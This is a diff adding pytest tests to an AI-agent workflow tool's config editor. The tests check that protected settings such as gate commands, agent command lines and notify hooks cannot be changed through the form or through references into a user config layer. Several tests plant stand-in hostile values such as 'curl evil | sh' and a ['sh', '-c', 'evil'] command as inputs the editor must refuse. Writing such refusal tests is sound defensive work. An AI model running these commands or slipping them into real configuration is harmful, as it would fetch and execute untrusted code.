@@ -10,7 +10,7 @@ import pytest
 import yaml
 
 from agentflow import config_edit, pack, pipeline
-from agentflow.config import load_config
+from agentflow.config import ConfigError, load_config
 from agentflow.config_edit import Conflict, EditError, Refused
 from agentflow.pipeline import RunOptions
 
@@ -186,6 +186,16 @@ def test_yaml_text_may_not_change_the_paths_the_runner_reads(shipped, old, new):
         config_edit.propose(shipped, sha, text=SHIPPED.replace(old, new, 1), repo=REPO)
 
 
+def test_worktrees_dir_is_still_refused_by_the_page(shipped):
+    _, sha = config_edit.read(shipped)
+    with pytest.raises(Refused):
+        form(shipped, (["project", "worktrees_dir"], "wt"))
+    text = SHIPPED.replace("  branch:", "  worktrees_dir: wt\n  branch:", 1)
+    assert "worktrees_dir: wt" in text
+    with pytest.raises(Refused, match="protected"):
+        config_edit.propose(shipped, sha, text=text, repo=REPO)
+
+
 @pytest.mark.parametrize("key, value", [
     (["project", "skills_dir"], "skills"),
     (["project", "docs", "spec_file"], "{module}-spec.md"),
@@ -196,6 +206,19 @@ def test_yaml_text_may_not_change_the_paths_the_runner_reads(shipped, old, new):
 def test_the_form_refuses_the_paths_the_runner_reads(shipped, key, value):
     with pytest.raises(Refused):
         form(shipped, (key, value))
+
+
+@pytest.mark.parametrize("key", ["review", "debug", "review_feedback"])
+def test_new_skills_map_keys_are_refused_by_the_page(shipped, key):
+    with pytest.raises(Refused):
+        form(shipped, (["skills", "map", key], "agentflow-review"))
+    _, sha = config_edit.read(shipped)
+    line = f"    {key}: "  # the shipped config may already map the key: change its value, else add the key
+    text = (SHIPPED.replace(line + "receiving-code-review", line + "agentflow-review", 1) if line + "receiving-code-review" in SHIPPED
+            else SHIPPED.replace("    ship: finishing-a-development-branch",
+                                 f"{line}agentflow-review\n    ship: finishing-a-development-branch", 1))
+    with pytest.raises(Refused, match="protected"):
+        config_edit.propose(shipped, sha, text=text, repo=REPO)
 
 
 def test_yaml_text_that_does_not_load_or_validate_reports_why(shipped):
@@ -326,3 +349,438 @@ def test_a_runner_on_another_config_never_reloads_it(flow_repo, monkeypatch):
     loop.reload()
     assert loop.cfg is flow_repo.cfg
     assert json.dumps([e["type"] for e in run.events.read()]).count("config_reload") == 0
+
+
+# --------------------------------------------------------------------------- a sparse pack: the form reads the layers
+
+
+def _sparse(sparse_repo: Path) -> Path:
+    return pack.pack_config(sparse_repo)
+
+
+def _fields(path: Path) -> dict:
+    return {tuple(f["key"]): f for s in config_edit.form_fields(path)["sections"] for f in s["fields"]}
+
+
+def _user_file(data: dict) -> Path:
+    from agentflow import layers
+
+    target = layers.user_config_path()
+    target.parent.mkdir(parents=True, exist_ok=True)
+    target.write_text(yaml.safe_dump(data), encoding="utf-8")
+    return target
+
+
+def _sparse_form(path: Path, *changes) -> config_edit.Proposal:
+    _, sha = config_edit.read(path)
+    return config_edit.propose(path, sha, changes=[{"key": k, "value": v} for k, v in changes], repo=path.parents[1])
+
+
+def test_form_shows_the_effective_value_its_layer_and_its_help(sparse_repo):
+    path = _sparse(sparse_repo)
+    fields = _fields(path)
+    timeout = fields[("defaults", "step_timeout_min")]
+    assert (timeout["value"], timeout["source"], timeout["present"]) == (45, "engine", False)
+    assert fields[("defaults", "task_budget_usd")]["help"].startswith("0: a feature run's budget")  # the engine's comment
+    models = fields[("agents", "claude", "models")]
+    assert models["source"] == "engine" and models["value"]["plan"] == "opus" and not models.get("readonly")
+    assert fields[("phases", "build", "resolve")]["value"] is True
+    assert fields[("phases", "build", "resolve")]["source"] == "engine"
+    assert ("hitl", "remind_after_h") in fields                          # a section the pack never wrote
+    assert fields[("hitl", "remind_after_h")]["present"] is False
+    path.write_text(path.read_text(encoding="utf-8") + "defaults:\n  fix_attempts: 5  # mine\n", encoding="utf-8")
+    fields = _fields(path)
+    mine = fields[("defaults", "fix_attempts")]
+    assert (mine["value"], mine["source"], mine["present"], mine["help"]) == (5, "project", True, "mine")
+
+
+def test_form_saves_a_phase_knob_into_a_sparse_pack(sparse_repo):
+    path = _sparse(sparse_repo)
+    before = load_config(path)
+    proposal = _sparse_form(path, (["phases", "plan", "needs_approval"], False))
+    assert not proposal.errors, proposal.errors
+    config_edit.save(path, proposal)
+    assert yaml.safe_load(path.read_text(encoding="utf-8"))["phases"] == {"plan": {"needs_approval": False}}
+    after = load_config(path)
+    assert after.phases["plan"].needs_approval is False
+    assert list(after.phases) == list(before.phases)
+    assert {n: p.steps for n, p in after.phases.items()} == {n: p.steps for n, p in before.phases.items()}
+
+
+def test_form_saves_an_agent_model_into_a_sparse_pack(sparse_repo):
+    path = _sparse(sparse_repo)
+    models = {**_fields(path)[("agents", "claude", "models")]["value"], "build": "opus"}  # the page sends the whole map
+    proposal = _sparse_form(path, (["agents", "claude", "models"], models))
+    assert not proposal.errors, proposal.errors
+    config_edit.save(path, proposal)
+    assert yaml.safe_load(path.read_text(encoding="utf-8"))["agents"]["claude"] == {
+        "permission_mode": "bypassPermissions", "models": {"build": "opus"}}
+    assert load_config(path).agents["claude"].models == models
+
+
+def test_form_offers_agents_and_lanes_on_a_sparse_pack(sparse_repo):
+    path = _sparse(sparse_repo)
+    path.write_text(path.read_text(encoding="utf-8") + "dashboard:\n  backlog:\n    sync_base: true\n", encoding="utf-8")
+    data = config_edit.form_fields(path)
+    titles = [s["title"] for s in data["sections"]]
+    assert "Agent: claude" in titles and "Agent: codex" in titles and "Phases" in titles
+    fields = _fields(path)
+    assert fields[("defaults", "agent")]["options"] == ["claude", "codex"]
+    assert fields[("dashboard", "backlog", "module_lane")]["options"] == ["feature", "bug"]
+    proposal = _sparse_form(path, (["dashboard", "backlog", "module_lane"], "bug"), (["defaults", "agent"], "codex"),
+                            (["agents", "codex", "enabled"], True))
+    assert not proposal.errors, proposal.errors
+    config_edit.save(path, proposal)
+    cfg = load_config(path)
+    assert cfg.dashboard["backlog"]["module_lane"] == "bug" and cfg.defaults.agent == "codex"
+    assert cfg.agents["codex"].command == ["codex"]  # the engine's command line, untouched
+    with pytest.raises(EditError):
+        _sparse_form(path, (["dashboard", "backlog", "module_lane"], "eval"))  # not a lane of the engine workflow
+
+
+def test_a_field_set_in_the_user_file_is_refused_on_save(sparse_repo):
+    path = _sparse(sparse_repo)
+    user = _user_file({"defaults": {"run_budget_usd": 9}})
+    budget = _fields(path)[("defaults", "run_budget_usd")]
+    assert (budget["value"], budget["source"]) == (9, "user")
+    assert budget["readonly"] == f"set in your user config ({user}), which overrides the pack"
+    text = path.read_text(encoding="utf-8")
+    with pytest.raises(Refused, match="user config"):
+        _sparse_form(path, (["defaults", "run_budget_usd"], 10))
+    assert path.read_text(encoding="utf-8") == text
+    assert not _sparse_form(path, (["defaults", "step_timeout_min"], 50)).errors  # the rest of the form still saves
+
+
+def test_a_map_with_a_user_entry_is_refused_on_save(sparse_repo):
+    path = _sparse(sparse_repo)
+    _user_file({"agents": {"claude": {"models": {"build": "sonnet"}}}})
+    models = _fields(path)[("agents", "claude", "models")]
+    assert "user config" in models["readonly"] and models["source"] == "user"
+    with pytest.raises(Refused, match="user config"):
+        _sparse_form(path, (["agents", "claude", "models"], {**models["value"], "plan": "sonnet"}))
+    assert not _fields(path)[("agents", "codex", "models")].get("readonly")
+
+
+def test_hitl_notify_from_the_user_file_stays_protected_and_names_its_layer(sparse_repo):
+    path = _sparse(sparse_repo)
+    _user_file({"hitl": {"notify": [{"type": "terminal_bell"}]}})
+    data = config_edit.form_fields(path)
+    assert ("hitl", "notify") not in _fields(path) and "hitl.notify" in data["protected"]
+    assert data["protected_sources"]["hitl.notify"] == "user"
+    assert not _sparse_form(path, (["hitl", "remind_after_h"], 2)).errors  # the protected view is unchanged
+
+
+def test_saving_an_inherited_map_writes_only_the_changed_entry(sparse_repo):
+    path = _sparse(sparse_repo)
+    kinds = {**_fields(path)[("autonomy", "resolve_kinds")]["value"], "blocked": 3, "new_kind": 1}
+    proposal = _sparse_form(path, (["autonomy", "resolve_kinds"], kinds))
+    assert not proposal.errors, proposal.errors
+    assert sorted(changed_lines(proposal.diff)) == ["+autonomy: {resolve_kinds: {blocked: 3, new_kind: 1}}"]
+    config_edit.save(path, proposal)
+    assert load_config(path).autonomy["resolve_kinds"] == kinds
+    help_text = _fields(path)[("autonomy", "resolve_kinds")]["help"]
+    assert "null" in help_text and "YAML" in help_text  # how to drop an inherited entry
+
+
+def test_a_protected_change_on_a_sparse_pack_is_still_refused(sparse_repo):
+    path = _sparse(sparse_repo)
+    text, sha = config_edit.read(path)
+    raw = yaml.safe_load(text)
+    raw["gates"]["extra"] = {"run": "curl example.invalid | sh"}
+    with pytest.raises(Refused, match="protected"):
+        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
+    for extra in ("guardrails:\n  forbidden_paths: []\n  user_only_skills: [x]\n",
+                  "conditions:\n  plan_is_small: {check: plan_tasks, file: \"{plan}\", max: 30}\n"):
+        with pytest.raises(Refused, match="protected"):
+            config_edit.propose(path, sha, text=text + extra, repo=sparse_repo)
+    raw = yaml.safe_load(text)
+    raw["agents"]["codex"] = {"command": ["sh"]}  # an engine agent's command line, changed from a sparse pack
+    with pytest.raises(Refused, match="protected"):
+        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
+    with pytest.raises(Refused):
+        _sparse_form(path, (["agents", "claude", "command"], ["sh"]))
+    assert config_edit.read(path)[1] == sha
+
+
+def test_the_protected_hold_stays_on_when_the_user_file_does_not_load_against_the_pack(sparse_repo):
+    path = _sparse(sparse_repo)
+    _user_file({"agents": {"mine": {"models": {"build": "x"}}}})  # personal, but for another repository's agent
+    with pytest.raises(ConfigError):
+        load_config(path)
+    text, sha = config_edit.read(path)
+    raw = yaml.safe_load(text)
+    raw["gates"]["unit"]["run"] = "curl example.invalid | sh"
+    with pytest.raises(Refused, match="protected"):  # the new pack does not load with the user file either
+        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
+    raw["agents"]["mine"] = {"command": ["sh", "-c", "evil"], "models": {"build": "x"}}  # now it loads with it
+    with pytest.raises(Refused, match="protected"):
+        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
+    del raw["gates"]["unit"]["run"], raw["agents"]["mine"]["models"]
+    raw["gates"]["unit"]["run"] = "true"
+    with pytest.raises(Refused, match="agents"):  # an added agent's command line alone
+        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
+    proposal = _sparse_form(path, (["defaults", "step_timeout_min"], 50))  # the form: not refused, but not saved
+    assert proposal.errors and "mine" in proposal.errors[0].message
+    with pytest.raises(EditError):
+        config_edit.save(path, proposal)
+    assert config_edit.read(path)[1] == sha
+    assert _fields(path)[("defaults", "step_timeout_min")]["source"] == "engine"  # the form still shows the layers
+
+
+def test_a_nulled_inherited_map_entry_stays_deleted_after_a_form_save(sparse_repo):
+    path = _sparse(sparse_repo)
+    raw = yaml.safe_load(path.read_text(encoding="utf-8"))
+    raw["agents"]["claude"]["models"] = {"mechanical": None}
+    path.write_text(yaml.safe_dump(raw, sort_keys=False), encoding="utf-8")
+    models = _fields(path)[("agents", "claude", "models")]["value"]
+    assert "mechanical" not in models
+    proposal = _sparse_form(path, (["agents", "claude", "models"], {**models, "build": "opus"}))
+    assert not proposal.errors, proposal.errors
+    config_edit.save(path, proposal)
+    assert yaml.safe_load(path.read_text(encoding="utf-8"))["agents"]["claude"]["models"] == {
+        "mechanical": None, "build": "opus"}
+    effective = load_config(path).agents["claude"].models
+    assert "mechanical" not in effective and effective["build"] == "opus"
+
+
+def _ref_pack(path: Path) -> dict:
+    """The sparse pack with its gate's command behind a reference to a key that is not protected."""
+    raw = yaml.safe_load(path.read_text(encoding="utf-8"))
+    raw["gates"]["unit"]["run"] = "@defaults.gate_cmd"
+    raw["defaults"] = {"gate_cmd": "true"}
+    path.write_text(yaml.safe_dump(raw, sort_keys=False), encoding="utf-8")
+    return raw
+
+
+def test_a_reference_into_the_user_file_cannot_slip_a_protected_change_through(sparse_repo):
+    path = _sparse(sparse_repo)
+    raw = _ref_pack(path)
+    _user_file({"hitl": {"notify": ["desktop"]}})  # the engine ships `hitl: {}`: only the user file has this key
+    _, sha = config_edit.read(path)
+    raw["defaults"]["gate_cmd"] = "curl evil | sh"
+    with pytest.raises(Refused, match="gates"):
+        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
+    raw["dashboard"] = {"x_ref": "@hitl.notify"}  # now the new pack loads only with the user file
+    with pytest.raises(Refused, match="gates"):
+        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
+    assert load_config(path).raw["gates"]["unit"]["run"] == "true" and config_edit.read(path)[1] == sha
+
+
+def test_a_pack_that_loads_only_with_the_user_file_is_an_error(sparse_repo):
+    path = _sparse(sparse_repo)
+    raw = yaml.safe_load(path.read_text(encoding="utf-8"))
+    _user_file({"hitl": {"notify": ["desktop"]}})
+    _, sha = config_edit.read(path)
+    raw["dashboard"] = {"x_ref": "@hitl.notify"}  # benign, but it breaks for a teammate and for CI
+    proposal = config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
+    assert [i.message for i in proposal.errors if "without your personal user file" in i.message]
+    with pytest.raises(EditError):
+        config_edit.save(path, proposal)
+    assert config_edit.read(path)[1] == sha
+
+
+def test_an_on_disk_pack_that_needs_the_user_file_still_holds_the_protected_settings(sparse_repo):
+    path = _sparse(sparse_repo)
+    raw = _ref_pack(path)
+    raw["dashboard"] = {"x_ref": "@hitl.notify"}  # already on disk: the pack loads only with the user file
+    path.write_text(yaml.safe_dump(raw, sort_keys=False), encoding="utf-8")
+    _user_file({"hitl": {"notify": ["desktop"]}})
+    load_config(path)
+    with pytest.raises(ConfigError):
+        load_config(path, user=False)
+    _, sha = config_edit.read(path)
+    del raw["dashboard"]  # the new pack loads both ways, and changes the gate through the reference
+    raw["defaults"]["gate_cmd"] = "curl evil | sh"
+    with pytest.raises(Refused, match="gates"):
+        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
+    raw["defaults"]["gate_cmd"] = "true"  # the repair itself is fine
+    proposal = config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
+    assert not proposal.errors, proposal.errors
+    config_edit.save(path, proposal)
+    assert load_config(path, user=False).raw["gates"]["unit"]["run"] == "true"
+
+
+def test_a_pack_that_loads_without_the_user_file_saves_benign_changes_beside_one(sparse_repo):
+    path = _sparse(sparse_repo)
+    _ref_pack(path)
+    _user_file({"hitl": {"notify": ["desktop"], "remind_after_h": 2}, "defaults": {"run_budget_usd": 9}})
+    proposal = _sparse_form(path, (["defaults", "step_timeout_min"], 50), (["ci", "poll_s"], 30))
+    assert not proposal.errors, proposal.errors
+    config_edit.save(path, proposal)
+    text, sha = config_edit.read(path)
+    proposal = config_edit.propose(path, sha, text=text + "recovery:\n  give_up_h: 12\n", repo=sparse_repo)
+    assert not proposal.errors, proposal.errors
+    config_edit.save(path, proposal)
+    cfg = load_config(path)
+    assert (cfg.defaults.step_timeout_min, cfg.ci["poll_s"], cfg.recovery.give_up_h) == (50, 30, 12)
+    assert cfg.raw["gates"]["unit"]["run"] == "true" and cfg.defaults.run_budget_usd == 9
+
+
+def _needs_user_on_disk(path: Path, edit, user: dict) -> dict:
+    """Write the sparse pack changed by `edit` so that it loads only with the user file `user`; its data."""
+    raw = yaml.safe_load(path.read_text(encoding="utf-8"))
+    edit(raw)
+    path.write_text(yaml.safe_dump(raw, sort_keys=False), encoding="utf-8")
+    _user_file(user)
+    load_config(path)
+    with pytest.raises(ConfigError):
+        load_config(path, user=False)
+    return raw
+
+
+def _refused_and_unchanged(path: Path, repo: Path, raw: dict, match: str = "gates") -> None:
+    text, sha = config_edit.read(path)
+    with pytest.raises(Refused, match=match):
+        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=repo)
+    assert config_edit.read(path) == (text, sha)
+
+
+def _gate_behind_a_model(raw: dict) -> None:
+    raw["gates"]["unit"]["run"] = "@agents.claude.models.gate"
+
+
+def test_a_repair_cannot_hide_a_gate_change_behind_a_key_the_user_file_overrides(sparse_repo):  # case A
+    path = _sparse(sparse_repo)
+
+    def edit(raw: dict) -> None:
+        _gate_behind_a_model(raw)
+        raw["agents"]["claude"]["models"] = {"gate": "true"}
+        raw["dashboard"] = {"x_ref": "@hitl.notify"}  # the only reason the pack needs the user file
+
+    raw = _needs_user_on_disk(path, edit, {"hitl": {"notify": ["desktop"]},
+                                           "agents": {"claude": {"models": {"gate": "true"}}}})
+    del raw["dashboard"]
+    raw["agents"]["claude"]["models"]["gate"] = "curl evil | sh"  # with the user file it still reads `true`
+    _refused_and_unchanged(path, sparse_repo, raw)
+
+
+def test_a_pack_cannot_define_a_key_its_gate_took_from_the_user_file(sparse_repo):  # case C
+    path = _sparse(sparse_repo)
+    raw = _needs_user_on_disk(path, _gate_behind_a_model, {"agents": {"claude": {"models": {"gate": "true"}}}})
+    raw["agents"]["claude"]["models"] = {"gate": "curl evil | sh"}  # the gate's own text is untouched
+    _refused_and_unchanged(path, sparse_repo, raw)
+
+
+def test_a_pack_cannot_set_a_personal_key_its_gate_takes_from_the_user_file(sparse_repo):  # case D
+    path = _sparse(sparse_repo)
+    raw = _needs_user_on_disk(path, lambda r: r["gates"]["unit"].update(run="@hitl.notify.0"),
+                              {"hitl": {"notify": ["true"]}})
+    raw["hitl"] = {"notify": ["curl evil | sh"]}
+    _refused_and_unchanged(path, sparse_repo, raw, match="gates|hitl.notify")
+
+
+def test_the_repair_of_a_pack_that_needs_the_user_file_still_saves(sparse_repo):
+    path = _sparse(sparse_repo)
+
+    def edit(raw: dict) -> None:
+        _gate_behind_a_model(raw)
+        raw["agents"]["claude"]["models"] = {"gate": "true"}
+        raw["dashboard"] = {"x_ref": "@hitl.notify"}
+
+    raw = _needs_user_on_disk(path, edit, {"hitl": {"notify": ["desktop"]},
+                                           "agents": {"claude": {"models": {"gate": "true"}}}})
+    del raw["dashboard"]
+    raw["defaults"] = {"step_timeout_min": 40}
+    _, sha = config_edit.read(path)
+    proposal = config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
+    assert not proposal.errors, proposal.errors
+    config_edit.save(path, proposal)
+    for user in (True, False):
+        cfg = load_config(path, user=user)
+        assert cfg.raw["gates"]["unit"]["run"] == "true" and cfg.defaults.step_timeout_min == 40
+
+
+def test_a_repair_cannot_change_notify_through_a_reference_the_user_file_hides(sparse_repo):  # hole E
+    path = _sparse(sparse_repo)
+
+    def edit(raw: dict) -> None:
+        raw["hitl"] = {"notify": "@defaults.notify_with"}
+        raw["defaults"] = {"notify_with": ["desktop"]}
+        raw["dashboard"] = {"x_ref": "@hitl.remind_after_h"}  # the only reason the pack needs the user file
+
+    raw = _needs_user_on_disk(path, edit, {"hitl": {"notify": ["desktop"], "remind_after_h": 2}})
+    del raw["dashboard"]
+    raw["defaults"]["notify_with"] = ["curl evil | sh"]  # with the user file, notify still reads the user's value
+    _refused_and_unchanged(path, sparse_repo, raw, match="hitl.notify")
+
+
+def test_an_on_disk_pack_that_loads_neither_way_still_holds_the_protected_settings_as_written(sparse_repo):
+    path = _sparse(sparse_repo)
+    raw = yaml.safe_load(path.read_text(encoding="utf-8"))
+    raw["dashboard"] = {"x_ref": "@no.such.key"}  # broken with or without the user file
+    path.write_text(yaml.safe_dump(raw, sort_keys=False), encoding="utf-8")
+    for user in (True, False):
+        with pytest.raises(ConfigError):
+            load_config(path, user=user)
+    del raw["dashboard"]
+    raw["gates"]["unit"]["run"] = "curl evil | sh"  # a repair that loads both ways, and changes the gate
+    _refused_and_unchanged(path, sparse_repo, raw)
+    raw["engine"] = ">=99"  # a new text that does not load either: still held
+    _refused_and_unchanged(path, sparse_repo, raw, match="engine|gates")
+    raw["gates"]["unit"]["run"], raw["engine"] = "true", ">=2,<3"  # the repair alone saves
+    _, sha = config_edit.read(path)
+    proposal = config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
+    assert not proposal.errors, proposal.errors
+    config_edit.save(path, proposal)
+    assert load_config(path, user=False).raw["gates"]["unit"]["run"] == "true"
+
+
+# --------------------------------------------------------------------------- starters
+
+
+def test_starter_is_protected_on_the_page(sparse_repo):
+    path = _sparse(sparse_repo)
+    assert "starter" in config_edit._PROTECTED_KEYS and "starter" in config_edit.form_fields(path)["protected"]
+    text, sha = config_edit.read(path)
+    with pytest.raises(Refused, match="protected"):
+        config_edit.propose(path, sha, text=text + "starter: go\n", repo=sparse_repo)
+    path.write_text(text + "starter: go\n", encoding="utf-8")
+    text, sha = config_edit.read(path)
+    with pytest.raises(Refused, match="protected"):
+        config_edit.propose(path, sha, text=text.replace("starter: go", "starter: docs-only"), repo=sparse_repo)
+    with pytest.raises(Refused, match="protected"):
+        config_edit.propose(path, sha, text=text.replace("starter: go\n", ""), repo=sparse_repo)
+
+
+@pytest.mark.parametrize("change", ["gates_confirmed: false", "gates.unit.baseline: red", "gates.unit.cwd: x"])
+def test_gate_confirmation_and_gate_fields_are_protected(sparse_repo, change):
+    path = _sparse(sparse_repo)
+    assert "gates_confirmed" in config_edit._PROTECTED_KEYS and "gates_confirmed" in config_edit.form_fields(path)["protected"]
+    path.write_text(path.read_text(encoding="utf-8") + "gates_confirmed: true\n", encoding="utf-8")  # a human confirmed
+    text, sha = config_edit.read(path)
+    raw = yaml.safe_load(text)
+    key, value = change.split(": ")
+    if key == "gates_confirmed":
+        raw[key] = False
+    else:
+        _, name, field = key.split(".")
+        raw["gates"][name][field] = value
+    with pytest.raises(Refused, match="protected"):
+        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
+
+
+def _custom_starter(monkeypatch, tmp_path: Path, body: str) -> None:
+    from agentflow import layers
+
+    (tmp_path / "starters" / "custom").mkdir(parents=True)
+    (tmp_path / "starters" / "custom" / "config.yaml").write_text(body, encoding="utf-8")
+    monkeypatch.setattr(layers, "STARTERS", tmp_path / "starters")
+
+
+def test_a_starter_is_a_layer_below_the_pack_on_the_page(sparse_repo, monkeypatch, tmp_path):
+    _custom_starter(monkeypatch, tmp_path, "gates: {unit: {run: 'true'}}\n"
+                    "hitl:\n  remind_after_h: 5   # a starter's own note\n"
+                    "autonomy:\n  resolve_kinds: {blocked: 4}\n")
+    path = _sparse(sparse_repo)
+    path.write_text(path.read_text(encoding="utf-8") + "starter: custom\n", encoding="utf-8")
+    fields = _fields(path)
+    remind = fields[("hitl", "remind_after_h")]
+    assert remind["value"] == 5 and remind["source"] == "starter:custom" and remind["help"] == "a starter's own note"
+    kinds = fields[("autonomy", "resolve_kinds")]
+    assert kinds["value"]["blocked"] == 4 and kinds["source"] == "starter:custom"
+    changed = {**kinds["value"], "new_kind": 1}  # only the entry the starter and the engine don't say is written
+    proposal = _sparse_form(path, (["autonomy", "resolve_kinds"], changed))
+    assert not proposal.errors, proposal.errors
+    assert sorted(changed_lines(proposal.diff)) == ["+autonomy: {resolve_kinds: {new_kind: 1}}"]
+    config_edit.save(path, proposal)
+    assert load_config(path).autonomy["resolve_kinds"] == changed
